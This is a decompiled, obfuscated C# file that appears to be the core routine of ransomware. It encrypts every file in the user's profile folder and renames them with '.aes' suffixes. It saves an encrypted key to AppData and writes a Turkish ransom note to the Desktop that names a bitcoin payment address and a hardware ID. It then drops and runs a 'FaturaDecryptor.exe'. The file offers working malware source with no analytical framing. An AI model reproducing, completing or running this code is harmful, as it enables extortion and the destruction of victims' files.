using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using ns5;

namespace ns0;

internal class Class1
{
	internal static void smethod_0()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes");
			string? environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.aes");
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "FaturaDecryptor.exe");
			string string_ = string.Empty;
			string string_2 = string.Empty;
			List<string> list = Class22.smethod_62(environmentVariable, "*.*");
			Class0 @class = new Class0();
			foreach (string item in list)
			{
				FileInfo fileInfo = new FileInfo(item);
				if (!(fileInfo.Extension == ".txt") && !(fileInfo.Extension == ".md"))
				{
					try
					{
						Class22.smethod_11(@class, fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.aes"));
					}
					catch (Exception)
					{
					}
				}
				else
				{
					try
					{
						Class22.smethod_17(fileInfo.FullName, @class);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.aes"));
					}
					catch (Exception)
					{
					}
				}
			}
			Class22.smethod_23(@class, 1024, out string_, ref string_2);
			byte[] byte_ = Class22.smethod_3(@class.method_0());
			byte_ = Class22.smethod_8(1024, byte_, @class, string_);
			File.WriteAllText(path2, Convert.ToBase64String(byte_));
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
			}
			string text2 = Class22.smethod_38();
			text2 = text2.Replace("[HWID goes here]", Class22.smethod_45());
			text2 = text2.Replace("[bitcoin address]", "bc1qwp2pa32m0djz8lhfzqhl7zvuq5nz4nen2azyyk5eds43lku7834qfk6den");
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Kurtarma Bilgisi.txt"), text2, Encoding.Unicode);
			Class22.smethod_36(string_2);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Class22.smethod_65());
			}
			Process.Start(text);
		}
		catch (Exception)
		{
		}
	}
}
